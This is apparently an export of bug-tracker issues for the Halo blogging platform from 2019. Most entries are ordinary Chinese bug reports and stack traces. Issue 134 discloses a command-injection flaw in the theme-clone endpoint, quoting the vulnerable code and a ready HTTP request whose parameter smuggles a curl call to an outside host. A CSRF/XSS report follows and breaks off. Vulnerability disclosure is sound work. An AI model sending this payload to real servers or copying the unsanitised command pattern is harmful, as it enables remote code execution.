~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) [javax.servlet-api-4.0.1.jar!/:4.0.1] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) ~[spring-webmvc-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) [javax.servlet-api-4.0.1.jar!/:4.0.1] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) [spring-boot-actuator-2.1.3.RELEASE.jar!/:2.1.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:115) [classes!/:1.0.3] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:151) [classes!/:1.0.3] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:39) [classes!/:1.0.3] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:33) [classes!/:1.0.3] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:117) [spring-boot-actuator-2.1.3.RELEASE.jar!/:2.1.3.RELEASE] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:106) [spring-boot-actuator-2.1.3.RELEASE.jar!/:2.1.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.5.RELEASE.jar!/:5.1.5.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) [undertow-servlet-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:364) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.17.Final.jar!/:2.0.17.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_212] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_212] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_212] ``` </body>
		<created>2019-08-07 16:37:26</created>
		<closed>2019-12-30 07:15:38</closed>
	</bug>
	<bug>
		<id>268</id>
		<title>问题231还是存在，作者可以看一下自己的博客。</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持   #231  这个问题还有的。作者看一下自己的博客： https://ryanc.cc/archives/halo-docker </body>
		<created>2019-08-01 02:06:14</created>
		<closed>2019-08-13 01:59:42</closed>
	</bug>
	<bug>
		<id>264</id>
		<title>文章路径中包含 &amp; 字符会导致站点地图出现错误</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-07-29 02:51:38</created>
		<closed>2019-07-29 12:20:13</closed>
	</bug>
	<bug>
		<id>263</id>
		<title>查看标签页面报错</title>
		<body>部分标签页面查看时报错： Request processing failed; nested exception is org.springframework.dao.IncorrectResultSizeDataAccessException: query did not return a unique result: 2; nested exception is javax.persistence.NonUniqueResultException: query did not return a unique result: 2</body>
		<created>2019-07-28 07:26:13</created>
		<closed>2019-11-22 14:52:57</closed>
	</bug>
	<bug>
		<id>259</id>
		<title>除了默认主题其他主题评论图标不显示</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  如图： ![Screenshot from 2019-07-24 22-28-59](https://user-images.githubusercontent.com/5105709/61802088-7be2cd00-ae62-11e9-8ea9-9aa5fc6c88ea.png) </body>
		<created>2019-07-24 14:29:36</created>
		<closed>2019-07-30 00:22:11</closed>
	</bug>
	<bug>
		<id>240</id>
		<title>偶发文章重复或文章分类与标签重复</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  文章重复的情况，查询数据发现除ID外所有字段内容相同，当重复时管理后台不能删除重复的文章，只能在数据库中删除。  标签和分类重复的文章，更新文章后，标签和分类仍然重复。  希望修复该问题，或者在问题发生后允许对这些数据进行调整。例如允许删除重复的文章；在更新文章时对标签和分类信息进行排重。</body>
		<created>2019-07-13 09:04:54</created>
		<closed>2019-11-22 14:54:24</closed>
	</bug>
	<bug>
		<id>232</id>
		<title>bug提交</title>
		<body>回收站的文章。在选择标签显示的时候（tags/xx）。会展示出来。但是不能打开。  &lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-07-05 14:15:21</created>
		<closed>2019-07-12 03:24:05</closed>
	</bug>
	<bug>
		<id>231</id>
		<title>点击进入文章，评论者的头像会访问https://cn.gravatar.com/avatar/426c255c998f48826b93e8e83203a889/?s=256&amp;d=undefined,然后跳转http://i1.wp.com/，进而导致https网站提示不安全</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-07-05 09:39:13</created>
		<closed>2019-07-07 04:57:47</closed>
	</bug>
	<bug>
		<id>229</id>
		<title>Application: Failed to retrieve application JMX service URL.</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ x] [Halo 使用文档](https://halo.run/docs) - [ x] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持   Application: Failed to retrieve application JMX service URL. 运行时有显示.listener.StartedListener    : Halo started at         http://10.201.30.243:8090 2019-07-02 19:45:52.623  INFO 11836 --- [  restartedMain] run.halo.app.listener.StartedListener    : Halo admin started at   http://10.201.30.243:8090/admin 但是输入网页不能正常打开  event log提示Application: Failed to retrieve application JMX service URL   问题是出在哪里啊，需要怎么解决该问题呢  谢谢！</body>
		<created>2019-07-02 13:07:04</created>
		<closed>2019-09-01 08:01:59</closed>
	</bug>
	<bug>
		<id>212</id>
		<title>Markdown 导入的时间转换错误</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [ ] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-06-20 03:29:40</created>
		<closed>2019-11-22 14:54:53</closed>
	</bug>
	<bug>
		<id>198</id>
		<title>删除主题后不能重新导入主题</title>
		<body> **我确定我已经查看了**  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  删除主题后用户目录下对应的主题文件夹没有删除，导致不能再次导入主题。 手动删除也不行，停掉服务后文件夹自动消失。 在调试主题的时候需要不停地启/停服务，有点难受。</body>
		<created>2019-06-11 16:19:20</created>
		<closed>2019-06-12 13:01:15</closed>
	</bug>
	<bug>
		<id>186</id>
		<title>404 请求被重定向至 /404</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ----  Expected：根据 HTTP 规范，404 请求应直接返回 `404` 状态码，同时返回 HTML Body。 现情况：所有 404 请求将会被返回 `302` 状态码并被重定向至 `/404` 解决方案：所有 404 请求应直接返回 `404` 状态码，直接渲染并返回主题目录下的 `/404.ftl`  PS: 500 请求的情况也是一样</body>
		<created>2019-06-07 01:10:20</created>
		<closed>2019-06-07 01:31:58</closed>
	</bug>
	<bug>
		<id>178</id>
		<title>索引长度超出了 mysql 的最大值 1000 bytes 导致项目启动失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 --- ```log Caused by: java.sql.SQLSyntaxErrorException: Specified key was too long; max key length is 1000 bytes at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120) ~[mysql-connector-java-8.0.15.jar!/:8.0.15] at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) ~[mysql-connector-java-8.0.15.jar!/:8.0.15] at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) ~[mysql-connector-java-8.0.15.jar!/:8.0.15] at com.mysql.cj.jdbc.StatementImpl.executeInternal(StatementImpl.java:782) ~[mysql-connector-java-8.0.15.jar!/:8.0.15] at com.mysql.cj.jdbc.StatementImpl.execute(StatementImpl.java:666) ~[mysql-connector-java-8.0.15.jar!/:8.0.15] at com.zaxxer.hikari.pool.ProxyStatement.execute(ProxyStatement.java:95) ~[HikariCP-3.2.0.jar!/:na] at com.zaxxer.hikari.pool.HikariProxyStatement.execute(HikariProxyStatement.java) ~[HikariCP-3.2.0.jar!/:na] at org.hibernate.tool.schema.internal.exec.GenerationTargetToDatabase.accept(GenerationTargetToDatabase.java:54) ~[hibernate-core-5.3.7.Final.jar!/:5.3.7.Final] ... 102 common frames omitted ```</body>
		<created>2019-06-04 08:33:30</created>
		<closed>2019-06-04 10:14:04</closed>
	</bug>
	<bug>
		<id>173</id>
		<title>InstallParam 验证有问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://halo.run/docs) - [ ] [Halo 论坛](https://bbs.halo.run) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-06-01 03:35:40</created>
		<closed>2019-06-01 08:47:40</closed>
	</bug>
	<bug>
		<id>164</id>
		<title>站点地图报错</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://docs.halo.run/) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  pageable参数不能为null</body>
		<created>2019-05-21 07:21:39</created>
		<closed>2019-05-21 10:29:30</closed>
	</bug>
	<bug>
		<id>160</id>
		<title>主题编辑二级目录的文件保存会失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://docs.halo.run/) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 RT</body>
		<created>2019-05-16 08:35:19</created>
		<closed>2019-05-16 15:14:28</closed>
	</bug>
	<bug>
		<id>153</id>
		<title>Windows 下上传的图片路径不对</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [ ] [Halo 使用文档](https://docs.halo.run/) - [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  RT  ![50902DCACF250B7D0C32E630404D83DA](https://user-images.githubusercontent.com/21301288/57570350-6baa7c80-7433-11e9-86b0-aaa90b7cff2e.jpg) </body>
		<created>2019-05-11 13:26:33</created>
		<closed>2019-05-11 16:00:56</closed>
	</bug>
	<bug>
		<id>134</id>
		<title>Remote Code Execution in your system</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ## Bug Report I read the code and find that  function `cloneFromRemote`  have a system call as ```java @PostMapping(value = "/clone")     @ResponseBody     public JsonResult cloneFromRemote(@RequestParam(value = "remoteAddr") String remoteAddr,                                       @RequestParam(value = "themeName") String themeName) {         if (StrUtil.isBlank(remoteAddr) || StrUtil.isBlank(themeName)) {             return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage("code.admin.common.info-no-complete"));         }         try {             final File basePath = new File(ResourceUtils.getURL("classpath:").getPath());             final File themePath = new File(basePath.getAbsolutePath(), "templates/themes");             final String cmdResult = RuntimeUtil.execForStr("git clone " + remoteAddr + " " + themePath.getAbsolutePath() + "/" + themeName);             if (NOT_FOUND_GIT.equals(cmdResult)) {                 return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage("code.admin.theme.no-git"));             }             THEMES.clear();             THEMES = HaloUtils.getThemes();         } catch (FileNotFoundException e) {             log.error("Cloning theme failed: {}", e.getMessage());             return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage("code.admin.theme.clone-theme-failed") + e.getMessage());         }         return new JsonResult(ResultCodeEnum.SUCCESS.getCode(), localeMessageUtil.getMessage("code.admin.common.install-success"));     } ``` in  ```java final String cmdResult = RuntimeUtil.execForStr("git clone " + remoteAddr + " " + themePath.getAbsolutePath() + "/" + themeName); ``` and you have do nothig with the `remoteAddr` and `themeName`, so I can type in  ``` remoteAddr=a &amp; curl xxx.xxx.xxx #  themeName = 2333 ``` and cmdString is ``` git clone a &amp; cmd # xxxxxx # cmd is your commad  ``` to RCE ```http POST /admin/themes/clone HTTP/1.1 Host: ******* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.47 Safari/537.36 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: ******* Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 60 Connection: close Cookie:  X-Forwarded-For: 127.0.0.2  remoteAddr=a+%26+curl+111111111%3A1339%23&amp;themeName=aaa ``` </body>
		<created>2019-04-04 08:32:35</created>
		<closed>2019-05-28 17:53:13</closed>
	</bug>
	<bug>
		<id>133</id>
		<title>A CSRF vulnerability and A XSS vulnerability in admin/tag/save</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 (security)  ---  A CSRF vulnerability and A XSS vulnerability in article tag save  was discovered in halo release v0.4.3  There is a CSRF vulnerability which allows remote attackers to send web page with CSRF script ,attackers could use this CSRF vulnerability `add  tag with XSS payload` .   XSS Vulnerability url: `https://demo.halo.run/admin/tag/save` CSRF Vulnerability url: `https://demo.halo.run/admin/tag/save`  eg.  ![image](https://user-images.githubusercontent.com/18072317/55539430-3358a580-56f3-11e9-92f7-099dcca549b5.png)  CSRF 